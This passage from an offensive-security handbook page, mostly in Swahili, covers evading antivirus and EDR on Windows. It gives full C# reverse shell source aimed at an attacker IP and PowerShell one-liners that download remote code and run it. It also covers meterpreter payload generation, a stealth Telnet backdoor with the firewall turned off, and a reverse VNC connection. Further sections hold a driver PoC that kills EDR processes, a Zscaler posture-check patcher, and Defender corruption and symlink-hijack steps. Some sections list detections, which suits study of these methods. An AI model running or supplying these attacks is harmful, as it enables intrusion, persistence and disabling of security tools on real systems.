- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt ni .NET PE Crypter imeandikwa kwa Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor inaweza kubadilisha EXE/DLL zilizopo kuwa shellcode na kisha kuzipakia

## SmartScreen & MoTW

Huenda umewahi kuona skrini hii unakapopakua baadhi ya executables kutoka internet na kuzitekeleza.

Microsoft Defender SmartScreen ni mekanisimu ya usalama iliyokusudiwa kulinda mtumiaji wa mwisho dhidi ya kuendesha applications zinazoweza kuwa hatari.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen kwa kawaida inafanya kazi kwa mtazamo wa msingi wa sifa (reputation-based), ikimaanisha kwamba applications ambazo hazipakuliwa mara kwa mara zitaleta uchunguzi wa SmartScreen na hivyo kutoa onyo na kuzuia mtumiaji kuendesha faili (hata hivyo faili bado inaweza kutekelezwa kwa kubonyeza More Info -> Run anyway).

**MoTW** (Mark of The Web) ni an [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) yenye jina Zone.Identifier ambayo inaundwa moja kwa moja wakati wa kupakua files kutoka kwenye internet, pamoja na URL ilikotoka.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Kuangalia Zone.Identifier ADS kwa faili iliyopakuliwa kutoka kwenye internet.</p></figcaption></figure>

> [!TIP]
> Ni muhimu kutambua kwamba executables zilizotiwa saini na **trusted** signing certificate **hazitawasha SmartScreen**.

Njia moja yenye ufanisi mkubwa ya kuzuia payloads zako kupata Mark of The Web ni kuzifungasha ndani ya aina fulani ya container kama ISO. Hii hutokea kwa sababu Mark-of-the-Web (MOTW) **haiwezi** kutumika kwa volumes zisizo za **NTFS**.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) ni tool inayofunga payloads ndani ya output containers ili kuepuka Mark-of-the-Web.

Mfano wa matumizi:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Here is a demo for bypassing SmartScreen by packaging payloads inside ISO files using [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) ni mekanisma yenye nguvu ya kurekodi matukio katika Windows ambayo inaruhusu programu na vipengele vya mfumo **kurekodi matukio**. Hata hivyo, pia inaweza kutumika na bidhaa za usalama kusimamia na kugundua shughuli za uharifu.

Sawa na jinsi AMSI inavyokatizwa (bypassed) pia inawezekana kufanya kazi ya **`EtwEventWrite`** ya mchakato wa user space irudi mara moja bila kurekodi matukio yoyote. Hii inafanywa kwa kurekebisha kazi hiyo kwenye memory ili irudi mara moja, kwa ufanisi kuzima ufuatiliaji wa ETW kwa mchakato huo.

Unaweza kupata habari zaidi katika **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) and [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.


## C# Assembly Reflection

Kupakia binaries za C# kwenye memory imekuwa ikijulikana kwa muda sasa na bado ni njia nzuri sana ya kuendesha zana zako za post-exploitation bila kushikwa na AV.

Kwa kuwa payload itapakiwa moja kwa moja kwenye memory bila kugusa disk, tutalazimika tu kujali kuhusu kurekebisha AMSI kwa mchakato mzima.

Wengi wa C2 frameworks (sliver, Covenant, metasploit, CobaltStrike, Havoc, etc.) tayari hutoa uwezo wa kutekeleza C# assemblies moja kwa moja kwenye memory, lakini kuna njia tofauti za kufanya hivyo:

- **Fork\&Run**

Inajumuisha **kuanzisha mchakato mpya wa sadaka**, kuingiza post-exploitation malicious code yako kwenye mchakato mpya huo, kutekeleza msimbo wako mbaya na ukimaliza, kuua mchakato mpya. Hii ina faida na hasara zake. Faida ya njia ya fork and run ni kwamba utekelezaji hufanyika **nje** ya Beacon implant process yetu. Hii ina maana kwamba kama kitu katika kitendo chetu cha post-exploitation kitatokea vibaya au kushikwa, kuna **mazingira makubwa** ya kuwa **implant yetu itaishi.** Hasara ni kwamba una **mazingira makubwa** ya kushikwa na **Behavioural Detections**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Inahusu kuingiza post-exploitation malicious code **ndani ya mchakato wake mwenyewe**. Kwa njia hii, unaweza kuepuka kuunda mchakato mpya na kupimwa na AV, lakini hasara ni kwamba ikiwa kitu kitakwenda vibaya na utekelezaji wa payload yako, kuna **mazingira makubwa** ya **kupoteza beacon** kwani inaweza kuanguka.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Ikiwa unataka kusoma zaidi kuhusu C# Assembly loading, tafadhali angalia makala hii [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) na InlineExecute-Assembly BOF yao ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Unaweza pia kupakia C# Assemblies **kutoka PowerShell**, angalia [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) na [S3cur3th1sSh1t's video](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Using Other Programming Languages

Kama ilivyopendekezwa katika [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), inawezekana kutekeleza malicious code kwa kutumia lugha nyingine kwa kutoa mashine iliyokataliwa ufikaji **katika interpreter environment iliyosakinishwa kwenye Attacker Controlled SMB share**.

Kwa kuruhusu ufikaji kwa Interpreter Binaries na mazingira kwenye SMB share unaweza **kutekeleza arbitrary code katika lugha hizi ndani ya memory** ya mashine iliyokataliwa.

Repo inabainisha: Defender bado inachunguza scripts lakini kwa kutumia Go, Java, PHP n.k. tuna **uruhusu zaidi kuepuka static signatures**. Kupima kwa kutumia random un-obfuscated reverse shell scripts katika lugha hizi kumeonyesha mafanikio.

## TokenStomping

Token stomping ni mbinu inayomruhusu mshambuliaji **kubadilisha access token au bidhaa ya usalama kama EDR au AV**, ikimruhusu kupunguza vibali hivyo mchakato hautakufa lakini hautakuwa na ruhusa za kukagua shughuli hatarishi.

Kuizuia hii Windows inaweza **kuzuia michakato ya nje** kupata handles juu ya token za michakato ya usalama.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

Kama ilivyoelezwa katika [**this blog post**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), ni rahisi tu kupeleka Chrome Remote Desktop kwenye PC ya mwathiriwa kisha kuitumia kuichukua na kudumisha persistence:
1. Pakua kutoka https://remotedesktop.google.com/, bonyeza "Set up via SSH", na kisha bonyeza faili la MSI la Windows kupakua faili la MSI.
2. Endesha installer kimya kwenye mwathiriwa (inahitaji admin): `msiexec /i chromeremotedesktophost.msi /qn`
3. Rudi kwenye ukurasa wa Chrome Remote Desktop na bonyeza next. Wizard kisha itakuuliza uuruhusu; bonyeza kitufe cha Authorize ili kuendelea.
4. Endesha parameter iliyotolewa kwa mabadiliko machache: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (Kumbuka param ya pin ambayo inaruhusu kuweka pin bila kutumia GUI).


## Advanced Evasion

Evasion ni mada ngumu sana, wakati mwingine lazima uzingatie vyanzo vingi tofauti vya telemetry ndani ya mfumo mmoja, hivyo karibu haiwezekani kubaki bila kugunduliwa kabisa katika mazingira yaliyozoweka.

Kila mazingira unayokabiliana nayo yatakuwa na nguvu na udhaifu wake wenyewe.

Ninakuhimiza sana uangalie hotuba hii kutoka kwa [@ATTL4S](https://twitter.com/DaniLJ94), ili kupata msingi wa mbinu zaidi za Advanced Evasion.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Hii pia ni hotuba nyingine nzuri kutoka kwa [@mariuszbit](https://twitter.com/mariuszbit) kuhusu Evasion in Depth.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Old Techniques**

### **Check which parts Defender finds as malicious**

Unaweza kutumia [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) ambayo itafanya **kuondoa sehemu za binary** hadi itakapogundua ni sehemu gani Defender inaona kama hatari na ikayigawanye kwako.\
Zana nyingine inayofanya kitu kama hicho ni [**avred**](https://github.com/dobin/avred) yenye huduma hiyo mtandaoni katika [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

Hadi Windows10, Windows zote zilikuja na **Telnet server** ambayo ungeweza kusakinisha (kama administrator) kwa kufanya:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Fanya **ianze** wakati mfumo unapoanzishwa na **endeshe** sasa:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Change telnet port** (stealth) na zimisha firewall:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Pakua kutoka: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (unataka bin downloads, sio setup)

**ON THE HOST**: Endesha _**winvnc.exe**_ na usanidi server:

- Wezesha chaguo _Disable TrayIcon_
- Weka nywila katika _VNC Password_
- Weka nywila katika _View-Only Password_

Kisha, hamisha binary _**winvnc.exe**_ na **newly** created file _**UltraVNC.ini**_ ndani ya **victim**

#### **Reverse connection**

The **attacker** anapaswa **execute inside** kwenye **host** yake the binary `vncviewer.exe -listen 5900` ili iwe **prepared** kukamata reverse **VNC connection**. Kisha, ndani ya **victim**: Anzisha daemon ya winvnc `winvnc.exe -run` na endesha `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

ONYO: Ili kubaki usiojulikana haupaswi kufanya mambo machache

- Don't start `winvnc` if it's already running or you'll trigger a [popup](https://i.imgur.com/1SROTTl.png). check if it's running with `tasklist | findstr winvnc`
- Don't start `winvnc` without `UltraVNC.ini` in the same directory or it will cause [the config window](https://i.imgur.com/rfMQWcf.png) to open
- Don't run `winvnc -h` for help or you'll trigger a [popup](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Pakua kutoka: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
Ndani ya GreatSCT:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Sasa **anza lister** kwa `msfconsole -r file.rc` na **tekeleza** **xml payload** kwa:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**Defender wa sasa atasitisha mchakato haraka sana.**

### Kuunda reverse shell yetu

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### C# Revershell ya kwanza

Ikompili kwa:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Tumia pamoja na:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# kutumia compiler
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Upakuaji na utekelezaji otomatiki:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Orodha ya obfuscators za C#: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/promheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Kutumia python kwa mfano wa kujenga injectors:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Zana nyingine
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### Zaidi

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Kuua AV/EDR Kutoka Kernel Space

Storm-2603 ilitumia utility ndogo ya console inayojulikana kama **Antivirus Terminator** ili kuzima kinga za endpoint kabla ya kuangusha ransomware. Zana hiyo inaleta **driver yake mwenye udhaifu lakini *signed*** na kuitumia kutoa operesheni za kernel zenye vigezo (privileged) ambazo hata huduma za AV za Protected-Process-Light (PPL) haziwezi kuzizuia.

Mambo muhimu
1. **Signed driver**: Faili iliyowekwa kwenye disk ni `ServiceMouse.sys`, lakini binary ni driver halali iliyosainiwa `AToolsKrnl64.sys` kutoka Antiy Labs’ “System In-Depth Analysis Toolkit”. Kwa kuwa driver ina saini halali ya Microsoft, inachomwa hata wakati Driver-Signature-Enforcement (DSE) imewezeshwa.
2. **Service installation**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
Mstari wa kwanza unasajili driver kama **kernel service** na wa pili unaianzisha ili `\\.\ServiceMouse` iweze kupatikana kutoka user land.
3. **IOCTLs exposed by the driver**
| IOCTL code | Uwezo                              |
|-----------:|-----------------------------------------|
| `0x99000050` | Kumaliza mchakato wowote kwa PID (kutumika kuua huduma za Defender/EDR) |
| `0x990000D0` | Futa faili yoyote kwenye disk |
| `0x990001D0` | Toa driver na ondoa service |

Minimal C proof-of-concept:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Why it works**: BYOVD inaruka kabisa kinga za user-mode; code inayotekelezwa katika kernel inaweza kufungua mchakato *uliohifadhiwa*, kuumaliza, au kuharibu vitu vya kernel bila kuzingatia PPL/PP, ELAM au vipengele vingine vya kuimarisha.

Utambuzi / Kupunguza
•  Washa orodha ya kuzuia vulnerable-driver ya Microsoft (`HVCI`, `Smart App Control`) ili Windows ikatae kuchoma `AToolsKrnl64.sys`.  
•  Fuatilia uundwaji wa huduma mpya za *kernel* na toa tahadhari wakati driver inachomwa kutoka saraka inayoweza kuandikwa na kila mtu au haipo kwenye allow-list.  
•  Angalia kwa user-mode handles kwa vitu vya kifaa maalum vinavyofuatiwa na simu za kushuku `DeviceIoControl`.

### Kuepuka Zscaler Client Connector Posture Checks kupitia On-Disk Binary Patching

Zscaler’s **Client Connector** inatumia sheria za device-posture kwa eneo la mteja na inategemea Windows RPC kuwasilisha matokeo kwa vipengele vingine. Chaguo mbili duni za kubuni zinafanya kuepuka kikamilifu kuwawezekana:

1. Tathmini ya posture hufanyika **kabisa upande wa client** (boolean hutumwa kwa server).  
2. Internal RPC endpoints zinathibitisha tu kwamba executable inayounganisha ni **signed by Zscaler** (kupitia `WinVerifyTrust`).

Kwa **kupatch binaries nne zilizotiwa saini kwenye disk** mbinu zote mbili zinaweza kuondolewa:

| Binary | Mantiki ya awali iliyobadilishwa | Matokeo |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Hutoa kila wakati `1` hivyo kila ukaguzi unahesabiwa kuwa inayotii |
| `ZSAService.exe` | Indirect call to `WinVerifyTrust` | NOP-ed ⇒ any (even unsigned) process can bind to the RPC pipes |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Replaced by `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Integrity checks on the tunnel | Short-circuited |

Sehemu fupi ya patcher:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
Baada ya kubadilisha faili za asili na kuwasha upya service stack:

* **Wote** vipimo vya posture vinaonyesha **kijani/zinakubalika**.
* Binary zisizosainiwa au zilizobadilishwa zinaweza kufungua named-pipe RPC endpoints (mfano `\\RPC Control\\ZSATrayManager_talk_to_me`).
* Kompyuta iliyodhulumiwa inapata upatikanaji usio na vizuizi kwenye mtandao wa ndani ulioainishwa na sera za Zscaler.

Utafiti huu wa kesi unaonyesha jinsi maamuzi ya uaminifu upande wa mteja pekee na ukaguzi rahisi wa saini yanaweza kushindwa kwa patchi chache za byte.

## Abusing Protected Process Light (PPL) To Tamper AV/EDR With LOLBINs

Protected Process Light (PPL) inatekeleza mtiririko wa mamlaka wa signer/level ili tu protected processes zilizo sawa au za juu ziweze kuingiliana. Kivamisheno, kama unaweza kuanzisha kwa njia halali binary iliyowezeshwa na PPL na kudhibiti vigezo vyake, unaweza kubadilisha utendaji usio hatari (mf., logging) kuwa primitive ya uandishi iliyozuiliwa, iliyotegemea PPL, dhidi ya directories zinazolindwa zinazotumika na AV/EDR.

What makes a process run as PPL
- The target EXE (and any loaded DLLs) must be signed with a PPL-capable EKU.
- The process must be created with CreateProcess using the flags: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- A compatible protection level must be requested that matches the signer of the binary (e.g., `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` for anti-malware signers, `PROTECTION_LEVEL_WINDOWS` for Windows signers). Wrong levels will fail at creation.

See also a broader intro to PP/PPL and LSASS protection here:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher tooling
- Open-source helper: CreateProcessAsPPL (selects protection level and forwards arguments to the target EXE):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- Usage pattern:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
Primitivu ya LOLBIN: ClipUp.exe
- The signed system binary `C:\Windows\System32\ClipUp.exe` self-spawns and accepts a parameter to write a log file to a caller-specified path.
- When launched as a PPL process, the file write occurs with PPL backing.
- ClipUp cannot parse paths containing spaces; use 8.3 short paths to point into normally protected locations.

8.3 short path helpers
- List short names: `dir /x` in each parent directory.
- Derive short path in cmd: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse chain (abstract)
1) Launch the PPL-capable LOLBIN (ClipUp) with `CREATE_PROTECTED_PROCESS` using a launcher (e.g., CreateProcessAsPPL).
2) Pass the ClipUp log-path argument to force a file creation in a protected AV directory (e.g., Defender Platform). Use 8.3 short names if needed.
3) If the target binary is normally open/locked by the AV while running (e.g., MsMpEng.exe), schedule the write at boot before the AV starts by installing an auto-start service that reliably runs earlier. Thibitisha utaratibu wa boot kwa kutumia Process Monitor (boot logging).
4) On reboot the PPL-backed write happens before the AV locks its binaries, corrupting the target file and preventing startup.

Example invocation (paths redacted/shortened for safety):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Vidokezo na vikwazo
- Huwezi kudhibiti yaliyomo ClipUp anaandika zaidi ya nafasi tu; primitive hii inafaa kwa uharibifu badala ya kuingiza maudhui kwa usahihi.
- Inahitaji local admin/SYSTEM ili kusanidi-kuanzisha service na wakati wa reboot.
- Muda ni muhimu: target haipaswi kuwa wazi; utekelezaji wakati wa boot unazuia file locks.

Uchunguzi
- Uundaji wa mchakato wa `ClipUp.exe` na hoja zisizo za kawaida, hasa ikiwa umezeeka na launchers wasiokuwa wa kawaida, karibu na boot.
- Services mpya zilizosanidiwa ku-auto-start binaries zenye mashaka na kuanza mara kwa mara kabla ya Defender/AV. Chunguza uundaji/badiliko la service kabla ya kushindwa kwa kuanza kwa Defender.
- File integrity monitoring kwenye Defender binaries/Platform directories; uundaji/usibadiliko usiotarajiwa wa faili na michakato yenye protected-process flags.
- ETW/EDR telemetry: angalia mchakato ulioundwa na `CREATE_PROTECTED_PROCESS` na matumizi yasiyo ya kawaida ya viwango vya PPL na binaries zisizo za AV.

Mikakati ya kupunguza
- WDAC/Code Integrity: punguza ni binaries zipi zilizosasishwa zinazoruhusiwa kuendesha kama PPL na chini ya wazazi gani; zuia ClipUp invocation nje ya muktadha halali.
- Usafi wa service: punguza uundaji/badilisho la auto-start services na fuatilia manipulation ya start-order.
- Hakikisha Defender tamper protection na early-launch protections zimeshawashwa; chunguza makosa ya startup yanayoonyesha uharibifu wa binary.
- Fikiria kuzima 8.3 short-name generation kwenye volumes zinazoendesha security tooling ikiwa inafaa kwa mazingira yako (jaribu kwa kina).

Marejeo kwa PPL na zana
- Microsoft Protected Processes overview: https://learn.microsoft.com/windows/win32/procthread/protected-processes
- EKU reference: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Procmon boot logging (ordering validation): https://learn.microsoft.com/sysinternals/downloads/procmon
- CreateProcessAsPPL launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
- Technique writeup (ClipUp + PPL + boot-order tamper): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

## Kudanganya Microsoft Defender kupitia Platform Version Folder Symlink Hijack

Windows Defender huchagua platform inayotekelezwa kutokana na kuorodhesha subfolders chini ya:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

Huchagua subfolder yenye string ya toleo ya juu kwa mfululizo wa leksikografia (mfano, `4.18.25070.5-0`), kisha huanzisha mchakato wa service za Defender kutoka hapo (ikibadilisha paths za service/registry kadri inavyohitajika). Uchaguzi huu unaaminiu directory entries ikiwemo directory reparse points (symlinks). Administrator anaweza kutumia hili kuelekeza Defender kwa njia inayoweza kuandikwa na mshambuliaji na kufikia DLL sideloading au kuharibu service.

Masharti ya awali
- Local Administrator (inahitajika kuunda directories/symlinks chini ya Platform folder)
- Uwezo wa kufanya reboot au kuanzisha upya uteuzi wa Defender platform (service restart on boot)
- Hata zana za ndani tu zinahitajika (mklink)

Kwa nini inafanya kazi
- Defender inazuia uandishi katika folder zake mwenyewe, lakini uteuzi wake wa platform unaamini directory entries na huchagua toleo la juu kwa leksikografia bila kuthibitisha kwamba lengo linaelekezwa kwenye path iliyolindwa/imeaminika.

Hatua kwa hatua (mfano)
1) Andaa clone inayoweza kuandikwa ya current platform folder, kwa mfano `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Unda symlink ya directory ya toleo la juu ndani ya Platform ikielekeza kwenye folda yako:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Uchaguzi wa trigger (reboot inapendekezwa):
```cmd
shutdown /r /t 0
```
4) Thibitisha MsMpEng.exe (WinDefend) inakimbia kutoka kwenye njia iliyolekezwa:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
